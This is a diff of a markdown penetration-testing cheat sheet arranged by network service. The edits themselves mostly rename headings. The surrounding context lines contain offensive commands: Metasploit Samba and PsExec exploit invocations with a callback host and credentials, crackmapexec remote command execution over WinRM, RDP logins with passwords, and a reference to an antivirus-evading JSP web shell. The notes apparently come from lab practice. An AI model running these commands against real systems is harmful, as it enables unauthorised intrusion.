@@ -80,7 +80,9 @@
 
 #### 21 FTP
 
-- [ ] Version: Check for FTP Version (ProFTPD, VSFTPD etc..) (If it is vulnerable)
+1. Check for FTP Version - version might be vulnerable - known exploit might exist
+
+-  Version: Check for FTP Version (ProFTPD, VSFTPD etc..) (If it is vulnerable)
     - `nmap 192.60.4.3 -sV -p 21`
 
 - [ ] Anonymous login: Check if FTP Anonymous login is allowed
@@ -91,7 +93,7 @@
 - Uploading and Downloading files
     - ftp> `get secret.txt`
 
-#### 22.SSH
+#### 22 SSH
 
 - OpenSSH version 
     - `nmap 192.238.103.3 -p 22 -sV -O`
@@ -109,13 +111,13 @@
     - `ssh -i ssh-key user@192.168.204.132 -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa`
 
 
-#### 25.SMTP
-#### 53.DNS
+#### 25 SMTP
+#### 53 DNS
 
 
 
 
-#### 80.HTTP
+#### 80 HTTP
 
 ###### Basic Enumeration
 
@@ -350,9 +352,10 @@ Here’s an example `web.xml` file.
         - https://github.com/SecurityRiskAdvisors/cmd.jsp
         - The web shell as is only gets detected by 2/58 anti-virus vendors.
 
-#### 161.SNMP
+#### 88 Kerberos
+#### 161 SNMP
 
-#### 445.SAMBA
+#### 445 SAMBA
 
 ##### Enumeration
 
@@ -442,7 +445,7 @@ Here’s an example `web.xml` file.
 - Exploiting Using Metasploit
     - `use exploit/linux/samba/is_known_pipename `
 
-#### 445.SMB
+#### 445 SMB
 
 ##### Enumeration
 
@@ -495,14 +498,14 @@ smb: \> mget *
         - Exploiting flaw using metasploit `PsExec` module
             - `use exploit/windows/smb/psexec` > `set RHOSTS 10.5.22.249` > `set LHOST 10.10.26.2` > `set SMBUSER administrator` > `set SMBPASS qwertyuiop` > `set LPORT 1234` > `exploit`
 
-#### 3389.RDP
+#### 3389 RDP
 
 - Connecting RDP
     - `xfreerdp /u:administrator /p:qwertyuiop /v:10.5.31.78:3333`
     - `rdesktop -u 'bitbucket' -p 'littleredbucket' 10.10.125.136:3389`
 
 
-#### 5985.WinRM
+#### 5985 WinRM
 
 - Arbitiary command execution
     - `crackmapexec winrm 10.5.27.211 -u administrator -p tinkerbell -x "whoami"` / `crackmapexec winrm 10.5.27.211 -u administrator -p tinkerbell -x "systeminfo"`
